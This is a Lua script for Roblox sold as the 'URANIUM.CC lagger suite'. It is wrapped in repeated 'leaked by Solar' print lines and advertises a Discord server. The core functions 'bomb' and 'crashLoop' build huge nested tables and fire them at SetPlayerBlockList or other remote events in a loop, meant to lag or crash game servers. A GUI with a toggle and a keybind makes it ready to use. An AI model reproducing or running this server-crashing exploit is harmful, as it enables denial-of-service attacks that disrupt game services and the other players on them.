-- Leaked By Solar and only Solar
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local NetworkClient = game:GetService("NetworkClient")
local TweenService = game:GetService("TweenService")
local lp = Players.LocalPlayer

-- Configurazione lagger
local cfg = {
    tableInc = 290,
    tries = 1,
    waitTime = 0.06
}

local laggerEnabled = false
local laggerThread = nil

-- Funzioni remote
local cachedRemote = nil

local function getDirectRemote()
    local ok, result = pcall(function()
        return game.RobloxReplicatedStorage.SetPlayerBlockList
    end)
    if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
        return result
    end
    return nil
end

local function findRemote()
    if cachedRemote and cachedRemote.Parent then return cachedRemote end
    local paths = {
        function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
        function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
        function() return game:FindFirstChild("SetPlayerBlockList", true) end,
    }
    for _, pathFn in ipairs(paths) do
        local ok, result = pcall(pathFn)
        if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
            cachedRemote = result
            return result
        end
    end
    local services = {ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage")}
    for _, service in ipairs(services) do
        if service then
            for _, obj in ipairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
                    local name = obj.Name:lower()
                    if name:find("block") or name:find("steal") or name:find("accept") or name:find("report") or name:find("player") then
                        cachedRemote = obj
                        return obj
                    end
                end
            end
        end
    end
    for _, service in ipairs(services) do
        if service then
            for _, obj in ipairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
                    cachedRemote = obj
                    return obj
                end
            end
        end
    end
    return nil
end

local function getRemote()
    local direct = getDirectRemote()
    if direct then return direct end
    return findRemote()
end

local function getmaxvalue(val)
    if type(val) ~= "number" then return nil end
    return 499999/(val+2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 10000 == 0 then task.wait() end
    end
    local remote = getRemote()
    if remote then
        for i = 1, tries do
            local ok, err = pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
            if not ok then
                warn("[CTE] Remote call failed: " .. tostring(err))
                cachedRemote = nil
            end
        end
    else
        warn("[CTE] No remote found!")
    end
end

local function crashLoop()
    while laggerEnabled do
        pcall(function()
            NetworkClient:SetOutgoingKBPSLimit(math.huge)
        end)
        pcall(function()
            settings().Network.IncomingReplicationLag = 0
        end)
        bomb(cfg.tableInc, cfg.tries)
        pcall(function()
            for i = 1, 50 do
                game:GetService("Stats"):Get("Network.ServerStatsItem")
            end
        end)
        task.wait(cfg.waitTime)
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(crashLoop)
    coroutine.resume(laggerThread)
end

local function stopLagger()
    laggerEnabled = false
    if laggerThread then
        pcall(function() coroutine.close(laggerThread) end)
        laggerThread = nil
    end
end

local function toggleLagger()
    if laggerEnabled then
        stopLagger()
    else
        startLagger()
    end
end

local function setPreset(value)
    cfg.tableInc = value
    if laggerEnabled then
        stopLagger()
        task.wait(0.2)
        startLagger()
    end
end

-- ============================================
--                 GUI URANIUM.CC
-- ============================================
local PlayerGui = lp:WaitForChild("PlayerGui")
if PlayerGui:FindFirstChild("UraniumCC") then
    PlayerGui.UraniumCC:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "UraniumCC"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 280, 0, 390)
MainFrame.Position = UDim2.new(0.05, 0, 0.12, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = 0.22
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(80, 220, 80)
MainStroke.Transparency = 0.78
MainStroke.Thickness = 1
MainStroke.Parent = MainFrame

local GuiBg = Instance.new("ImageLabel")
GuiBg.Size = UDim2.new(1, 0, 1, 0)
GuiBg.BackgroundTransparency = 1
GuiBg.Image = "rbxassetid://74530856793469"
GuiBg.ScaleType = Enum.ScaleType.Crop
GuiBg.ImageTransparency = 0.6
GuiBg.ZIndex = 0
GuiBg.Parent = MainFrame

local GuiBgCorner = Instance.new("UICorner")
GuiBgCorner.CornerRadius = UDim.new(0, 10)
GuiBgCorner.Parent = GuiBg

-- HEADER
local HeaderBar = Instance.new("Frame")
HeaderBar.Size = UDim2.new(1, 0, 0, 58)
HeaderBar.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
HeaderBar.BackgroundTransparency = 0
HeaderBar.BorderSizePixel = 0
HeaderBar.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 10)
HeaderCorner.Parent = HeaderBar

local HeaderFix = Instance.new("Frame")
HeaderFix.Size = UDim2.new(1, 0, 0, 14)
HeaderFix.Position = UDim2.new(0, 0, 1, -14)
HeaderFix.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
HeaderFix.BackgroundTransparency = 0
HeaderFix.BorderSizePixel = 0
HeaderFix.Parent = HeaderBar

local HeaderGlow = Instance.new("Frame")
HeaderGlow.Size = UDim2.new(1, 0, 0, 1)
HeaderGlow.Position = UDim2.new(0, 0, 1, -1)
HeaderGlow.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
HeaderGlow.BackgroundTransparency = 0.55
HeaderGlow.BorderSizePixel = 0
HeaderGlow.Parent = HeaderBar

local HeaderGlowSoft = Instance.new("Frame")
HeaderGlowSoft.Size = UDim2.new(1, 0, 0, 3)
HeaderGlowSoft.Position = UDim2.new(0, 0, 1, -4)
HeaderGlowSoft.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
HeaderGlowSoft.BackgroundTransparency = 0.88
HeaderGlowSoft.BorderSizePixel = 0
HeaderGlowSoft.Parent = HeaderBar

local GradBar = Instance.new("Frame")
GradBar.Size = UDim2.new(0, 5, 1, -16)
GradBar.Position = UDim2.new(0, 14, 0, 8)
GradBar.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
GradBar.BorderSizePixel = 0
GradBar.Parent = HeaderBar

local GradBarCorner = Instance.new("UICorner")
GradBarCorner.CornerRadius = UDim.new(0, 3)
GradBarCorner.Parent = GradBar

local GradBarGradient = Instance.new("UIGradient")
GradBarGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 255, 80)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 60, 10))
})
GradBarGradient.Rotation = 90
GradBarGradient.Parent = GradBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(0, 110, 0, 20)
TitleLabel.Position = UDim2.new(0, 28, 0, 10)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "URANIUM.CC"
TitleLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
TitleLabel.TextSize = 14
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = HeaderBar

local SubLabel = Instance.new("TextLabel")
SubLabel.Size = UDim2.new(0, 130, 0, 14)
SubLabel.Position = UDim2.new(0, 28, 0, 30)
SubLabel.BackgroundTransparency = 1
SubLabel.Text = "lagger suite  â€¢  v3"
SubLabel.TextColor3 = Color3.fromRGB(80, 220, 80)
SubLabel.TextTransparency = 0.3
SubLabel.TextSize = 9
SubLabel.Font = Enum.Font.Gotham
SubLabel.TextXAlignment = Enum.TextXAlignment.Left
SubLabel.Parent = HeaderBar

-- Minimize
local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Size = UDim2.new(0, 26, 0, 20)
MinimizeBtn.Position = UDim2.new(1, -62, 0.5, -10)
MinimizeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 8)
MinimizeBtn.BackgroundTransparency = 0
MinimizeBtn.Text = "â€“"
MinimizeBtn.TextColor3 = Color3.fromRGB(230, 210, 60)
MinimizeBtn.TextSize = 14
MinimizeBtn.Font = Enum.Font.GothamBold
MinimizeBtn.BorderSizePixel = 0
MinimizeBtn.Parent = HeaderBar

local MinimizeCorner = Instance.new("UICorner")
MinimizeCorner.CornerRadius = UDim.new(0, 5)
MinimizeCorner.Parent = MinimizeBtn

local MinimizeStroke = Instance.new("UIStroke")
MinimizeStroke.Color = Color3.fromRGB(200, 180, 40)
MinimizeStroke.Transparency = 0.45
MinimizeStroke.Thickness = 1
MinimizeStroke.Parent = MinimizeBtn

-- Close
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 26, 0, 20)
CloseBtn.Position = UDim2.new(1, -32, 0.5, -10)
CloseBtn.BackgroundColor3 = Color3.fromRGB(100, 18, 18)
CloseBtn.BackgroundTransparency = 0
CloseBtn.Text = "Ã—"
CloseBtn.TextColor3 = Color3.fromRGB(255, 180, 180)
CloseBtn.TextSize = 15
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = HeaderBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 5)
CloseCorner.Parent = CloseBtn

local CloseStroke = Instance.new("UIStroke")
CloseStroke.Color = Color3.fromRGB(220, 60, 60)
CloseStroke.Transparency = 0.4
CloseStroke.Thickness = 1
CloseStroke.Parent = CloseBtn

local minimized = false
MinimizeBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    ContentFrame.Visible = not minimized
    MinimizeBtn.Text = minimized and "â–²" or "â€“"
    if minimized then
        MainFrame.Size = UDim2.new(0, 280, 0, 58)
    else
        MainFrame.Size = UDim2.new(0, 280, 0, 390)
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- CONTENT
local ContentFrame = Instance.new("Frame")
ContentFrame.Size = UDim2.new(1, 0, 1, -68)
ContentFrame.Position = UDim2.new(0, 0, 0, 58)
ContentFrame.BackgroundTransparency = 1
ContentFrame.BorderSizePixel = 0
ContentFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 12)
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Parent = ContentFrame

local UIPadding = Instance.new("UIPadding")
UIPadding.PaddingTop = UDim.new(0, 16)
UIPadding.PaddingLeft = UDim.new(0, 14)
UIPadding.PaddingRight = UDim.new(0, 14)
UIPadding.Parent = ContentFrame

local function CreateDivider(order)
    local D = Instance.new("Frame")
    D.LayoutOrder = order
    D.Size = UDim2.new(1, 0, 0, 1)
    D.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    D.BackgroundTransparency = 0
    D.BorderSizePixel = 0
    D.Parent = ContentFrame
end

-- Section: Lagger Toggles
local SectionLabel = Instance.new("TextLabel")
SectionLabel.LayoutOrder = 1
SectionLabel.Size = UDim2.new(1, 0, 0, 16)
SectionLabel.BackgroundTransparency = 1
SectionLabel.Text = "Lagger Toggles"
SectionLabel.TextColor3 = Color3.fromRGB(130, 130, 130)
SectionLabel.TextSize = 11
SectionLabel.Font = Enum.Font.Gotham
SectionLabel.TextXAlignment = Enum.TextXAlignment.Left
SectionLabel.Parent = ContentFrame

-- Activate Button
local ActivateBtn = Instance.new("TextButton")
ActivateBtn.LayoutOrder = 2
ActivateBtn.Size = UDim2.new(1, 0, 0, 42)
ActivateBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
ActivateBtn.Text = ""
ActivateBtn.BorderSizePixel = 0
ActivateBtn.Parent = ContentFrame

local ActivateCorner = Instance.new("UICorner")
ActivateCorner.CornerRadius = UDim.new(0, 6)
ActivateCorner.Parent = ActivateBtn

local AccentBar = Instance.new("Frame")
AccentBar.Size = UDim2.new(0, 3, 1, 0)
AccentBar.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
AccentBar.BorderSizePixel = 0
AccentBar.Parent = ActivateBtn

local AccentBarCorner = Instance.new("UICorner")
AccentBarCorner.CornerRadius = UDim.new(0, 6)
AccentBarCorner.Parent = AccentBar

local ActivateText = Instance.new("TextLabel")
ActivateText.Size = UDim2.new(1, -16, 1, 0)
ActivateText.Position = UDim2.new(0, 14, 0, 0)
ActivateText.BackgroundTransparency = 1
ActivateText.Text = "ACTIVATE"
ActivateText.TextColor3 = Color3.fromRGB(210, 210, 210)
ActivateText.TextSize = 13
ActivateText.Font = Enum.Font.GothamBold
ActivateText.TextXAlignment = Enum.TextXAlignment.Left
ActivateText.Parent = ActivateBtn

local StatusDot = Instance.new("Frame")
StatusDot.Size = UDim2.new(0, 7, 0, 7)
StatusDot.Position = UDim2.new(1, -18, 0.5, -3)
StatusDot.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
StatusDot.BorderSizePixel = 0
StatusDot.Parent = ActivateBtn

local StatusDotCorner = Instance.new("UICorner")
StatusDotCorner.CornerRadius = UDim.new(1, 0)
StatusDotCorner.Parent = StatusDot

local ActivateStroke = Instance.new("UIStroke")
ActivateStroke.Color = Color3.fromRGB(255, 255, 255)
ActivateStroke.Transparency = 0.9
ActivateStroke.Thickness = 1
ActivateStroke.Parent = ActivateBtn

local activated = false
ActivateBtn.MouseButton1Click:Connect(function()
    activated = not activated
    if activated then
        ActivateText.Text = "DEACTIVATE"
        ActivateText.TextColor3 = Color3.fromRGB(80, 220, 80)
        StatusDot.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
        ActivateStroke.Color = Color3.fromRGB(80, 220, 80)
        ActivateStroke.Transparency = 0.75
        toggleLagger()
    else
        ActivateText.Text = "ACTIVATE"
        ActivateText.TextColor3 = Color3.fromRGB(210, 210, 210)
        StatusDot.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        ActivateStroke.Color = Color3.fromRGB(255, 255, 255)
        ActivateStroke.Transparency = 0.9
        toggleLagger()
    end
end)

CreateDivider(3)

-- Keybind System
local KeybindLabel = Instance.new("TextLabel")
KeybindLabel.LayoutOrder = 4
KeybindLabel.Size = UDim2.new(1, 0, 0, 16)
KeybindLabel.BackgroundTransparency = 1
KeybindLabel.Text = "Keybind System"
KeybindLabel.TextColor3 = Color3.fromRGB(130, 130, 130)
KeybindLabel.TextSize = 11
KeybindLabel.Font = Enum.Font.Gotham
KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
KeybindLabel.Parent = ContentFrame

local currentKey = "F"
local listeningForKey = false

local KeybindBtn = Instance.new("TextButton")
KeybindBtn.LayoutOrder = 5
KeybindBtn.Size = UDim2.new(1, 0, 0, 58)
KeybindBtn.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
KeybindBtn.Text = ""
KeybindBtn.BorderSizePixel = 0
KeybindBtn.Parent = ContentFrame

local KeybindCorner = Instance.new("UICorner")
KeybindCorner.CornerRadius = UDim.new(0, 6)
KeybindCorner.Parent = KeybindBtn

local KeyAccentBar = Instance.new("Frame")
KeyAccentBar.Size = UDim2.new(0, 3, 1, 0)
KeyAccentBar.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
KeyAccentBar.BorderSizePixel = 0
KeyAccentBar.Parent = KeybindBtn

local KeyAccentCorner = Instance.new("UICorner")
KeyAccentCorner.CornerRadius = UDim.new(0, 6)
KeyAccentCorner.Parent = KeyAccentBar

local KeybindLeftText = Instance.new("TextLabel")
KeybindLeftText.Size = UDim2.new(0, 120, 0, 20)
KeybindLeftText.Position = UDim2.new(0, 14, 0, 10)
KeybindLeftText.BackgroundTransparency = 1
KeybindLeftText.Text = "KEYBIND"
KeybindLeftText.TextColor3 = Color3.fromRGB(210, 210, 210)
KeybindLeftText.TextSize = 13
KeybindLeftText.Font = Enum.Font.GothamBold
KeybindLeftText.TextXAlignment = Enum.TextXAlignment.Left
KeybindLeftText.Parent = KeybindBtn

local KeybindSubText = Instance.new("TextLabel")
KeybindSubText.Size = UDim2.new(0, 140, 0, 16)
KeybindSubText.Position = UDim2.new(0, 14, 0, 30)
KeybindSubText.BackgroundTransparency = 1
KeybindSubText.Text = "Click to change key"
KeybindSubText.TextColor3 = Color3.fromRGB(80, 80, 80)
KeybindSubText.TextSize = 10
KeybindSubText.Font = Enum.Font.Gotham
KeybindSubText.TextXAlignment = Enum.TextXAlignment.Left
KeybindSubText.Parent = KeybindBtn

local KeyBadge = Instance.new("Frame")
KeyBadge.Size = UDim2.new(0, 44, 0, 30)
KeyBadge.Position = UDim2.new(1, -54, 0.5, -15)
KeyBadge.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
KeyBadge.BorderSizePixel = 0
KeyBadge.Parent = KeybindBtn

local KeyBadgeCorner = Instance.new("UICorner")
KeyBadgeCorner.CornerRadius = UDim.new(0, 5)
KeyBadgeCorner.Parent = KeyBadge

local KeyBadgeStroke = Instance.new("UIStroke")
KeyBadgeStroke.Color = Color3.fromRGB(80, 220, 80)
KeyBadgeStroke.Transparency = 0.45
KeyBadgeStroke.Thickness = 1
KeyBadgeStroke.Parent = KeyBadge

local KeyBadgeText = Instance.new("TextLabel")
KeyBadgeText.Size = UDim2.new(1, 0, 1, 0)
KeyBadgeText.BackgroundTransparency = 1
KeyBadgeText.Text = currentKey
KeyBadgeText.TextColor3 = Color3.fromRGB(80, 220, 80)
KeyBadgeText.TextSize = 14
KeyBadgeText.Font = Enum.Font.GothamBold
KeyBadgeText.Parent = KeyBadge

local KeybindStroke = Instance.new("UIStroke")
KeybindStroke.Color = Color3.fromRGB(255, 255, 255)
KeybindStroke.Transparency = 0.9
KeybindStroke.Thickness = 1
KeybindStroke.Parent = KeybindBtn

KeybindBtn.MouseButton1Click:Connect(function()
    if listeningForKey then return end
    listeningForKey = true
    KeybindLeftText.Text = "PRESS ANY KEY"
    KeybindLeftText.TextColor3 = Color3.fromRGB(80, 220, 80)
    KeybindSubText.Text = "Waiting for input..."
    KeyBadgeText.Text = "?"
    KeyBadgeText.TextColor3 = Color3.fromRGB(160, 160, 160)
    KeyBadgeStroke.Color = Color3.fromRGB(160, 160, 160)
    KeybindStroke.Color = Color3.fromRGB(80, 220, 80)
    KeybindStroke.Transparency = 0.6
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not listeningForKey then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        local keyName = tostring(input.KeyCode):gsub("Enum.KeyCode.", "")
        if #keyName > 5 then keyName = keyName:sub(1, 4) end
        currentKey = keyName
        KeyBadgeText.Text = currentKey
        KeyBadgeText.TextColor3 = Color3.fromRGB(80, 220, 80)
        KeyBadgeStroke.Color = Color3.fromRGB(80, 220, 80)
        KeyBadgeStroke.Transparency = 0.45
        KeybindLeftText.Text = "KEYBIND"
        KeybindLeftText.TextColor3 = Color3.fromRGB(210, 210, 210)
        KeybindSubText.Text = "Click to change key"
        KeybindStroke.Color = Color3.fromRGB(255, 255, 255)
        KeybindStroke.Transparency = 0.9
        listeningForKey = false
    end
end)

CreateDivider(6)

-- Power Toggles
local PowerLabel = Instance.new("TextLabel")
PowerLabel.LayoutOrder = 7
PowerLabel.Size = UDim2.new(1, 0, 0, 16)
PowerLabel.BackgroundTransparency = 1
PowerLabel.Text = "Power Toggles"
PowerLabel.TextColor3 = Color3.fromRGB(130, 130, 130)
PowerLabel.TextSize = 11
PowerLabel.Font = Enum.Font.Gotham
PowerLabel.TextXAlignment = Enum.TextXAlignment.Center
PowerLabel.Parent = ContentFrame

local PowerBtnsContainer = Instance.new("Frame")
PowerBtnsContainer.LayoutOrder = 8
PowerBtnsContainer.Size = UDim2.new(1, 0, 0, 42)
PowerBtnsContainer.BackgroundTransparency = 1
PowerBtnsContainer.BorderSizePixel = 0
PowerBtnsContainer.Parent = ContentFrame

local PowerListLayout = Instance.new("UIListLayout")
PowerListLayout.FillDirection = Enum.FillDirection.Horizontal
PowerListLayout.Padding = UDim.new(0, 8)
PowerListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
PowerListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
PowerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
PowerListLayout.Parent = PowerBtnsContainer

local powerButtons = {}

local function SetPowerButton(target, on)
    target.BtnText.TextColor3 = on and Color3.fromRGB(80, 220, 80) or Color3.fromRGB(210, 210, 210)
    target.BtnDot.BackgroundColor3 = on and Color3.fromRGB(80, 220, 80) or Color3.fromRGB(80, 80, 80)
    target.BtnStroke.Color = on and Color3.fromRGB(80, 220, 80) or Color3.fromRGB(255, 255, 255)
    target.BtnStroke.Transparency = on and 0.75 or 0.9
    target.active = on
end

local function CreatePowerButton(labelText, order, presetValue)
    local Btn = Instance.new("TextButton")
    Btn.LayoutOrder = order
    Btn.Size = UDim2.new(0, 118, 0, 42)
    Btn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
    Btn.BackgroundTransparency = 0
    Btn.Text = ""
    Btn.BorderSizePixel = 0
    Btn.Parent = PowerBtnsContainer

    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 6)
    BtnCorner.Parent = Btn

    local BtnAccent = Instance.new("Frame")
    BtnAccent.Size = UDim2.new(0, 3, 1, 0)
    BtnAccent.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
    BtnAccent.BorderSizePixel = 0
    BtnAccent.Parent = Btn

    local BtnAccentCorner = Instance.new("UICorner")
    BtnAccentCorner.CornerRadius = UDim.new(0, 6)
    BtnAccentCorner.Parent = BtnAccent

    local BtnText = Instance.new("TextLabel")
    BtnText.Size = UDim2.new(1, -16, 1, 0)
    BtnText.Position = UDim2.new(0, 14, 0, 0)
    BtnText.BackgroundTransparency = 1
    BtnText.Text = labelText
    BtnText.TextColor3 = Color3.fromRGB(210, 210, 210)
    BtnText.TextSize = 13
    BtnText.Font = Enum.Font.GothamBold
    BtnText.TextXAlignment = Enum.TextXAlignment.Left
    BtnText.Parent = Btn

    local BtnDot = Instance.new("Frame")
    BtnDot.Size = UDim2.new(0, 7, 0, 7)
    BtnDot.Position = UDim2.new(1, -14, 0.5, -3)
    BtnDot.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    BtnDot.BorderSizePixel = 0
    BtnDot.Parent = Btn

    local BtnDotCorner = Instance.new("UICorner")
    BtnDotCorner.CornerRadius = UDim.new(1, 0)
    BtnDotCorner.Parent = BtnDot

    local BtnStroke = Instance.new("UIStroke")
    BtnStroke.Color = Color3.fromRGB(255, 255, 255)
    BtnStroke.Transparency = 0.9
    BtnStroke.Thickness = 1
    BtnStroke.Parent = Btn

    local entry = { 
        Btn = Btn, 
        BtnText = BtnText, 
        BtnDot = BtnDot, 
        BtnStroke = BtnStroke, 
        active = false,
        presetValue = presetValue
    }
    table.insert(powerButtons, entry)

    Btn.MouseButton1Click:Connect(function()
        for _, pb in ipairs(powerButtons) do
            SetPowerButton(pb, false)
        end
        SetPowerButton(entry, true)
        setPreset(presetValue)
    end)

    return Btn
end

CreatePowerButton("MAIN", 1, 290)
CreatePowerButton("LOWER", 2, 285)

for _, pb in ipairs(powerButtons) do
    if pb.presetValue == 290 then
        SetPowerButton(pb, true)
        cfg.tableInc = 290
        break
    end
end

-- Discord link
local DiscordBtn = Instance.new("TextButton")
DiscordBtn.LayoutOrder = 9
DiscordBtn.Size = UDim2.new(1, 0, 0, 28)
DiscordBtn.BackgroundTransparency = 1
DiscordBtn.Text = ".gg/uraniumm"
DiscordBtn.TextColor3 = Color3.fromRGB(57, 255, 20)
DiscordBtn.TextSize = 12
DiscordBtn.Font = Enum.Font.GothamBold
DiscordBtn.TextXAlignment = Enum.TextXAlignment.Center
DiscordBtn.BorderSizePixel = 0
DiscordBtn.Parent = ContentFrame

local copied = false
DiscordBtn.MouseButton1Click:Connect(function()
    if copied then return end
    copied = true
    setclipboard("discord.gg/uraniumm")
    DiscordBtn.Text = "copied!"
    DiscordBtn.TextColor3 = Color3.fromRGB(200, 255, 200)
    task.wait(1.5)
    DiscordBtn.Text = ".gg/uraniumm"
    DiscordBtn.TextColor3 = Color3.fromRGB(57, 255, 20)
    copied = false
end)

-- Keybind toggle globale
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode[currentKey] then
        toggleLagger()
        activated = laggerEnabled
        if activated then
            ActivateText.Text = "DEACTIVATE"
            ActivateText.TextColor3 = Color3.fromRGB(80, 220, 80)
            StatusDot.BackgroundColor3 = Color3.fromRGB(80, 220, 80)
            ActivateStroke.Color = Color3.fromRGB(80, 220, 80)
            ActivateStroke.Transparency = 0.75
        else
            ActivateText.Text = "ACTIVATE"
            ActivateText.TextColor3 = Color3.fromRGB(210, 210, 210)
            StatusDot.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
            ActivateStroke.Color = Color3.fromRGB(255, 255, 255)
            ActivateStroke.Transparency = 0.9
        end
    end
end)

-- Respawn handler
lp.CharacterAdded:Connect(function()
    task.wait(1)
    if laggerEnabled then
        stopLagger()
        task.wait(0.5)
        startLagger()
    end
end)
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("robbed by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
print("leaked by Solar")
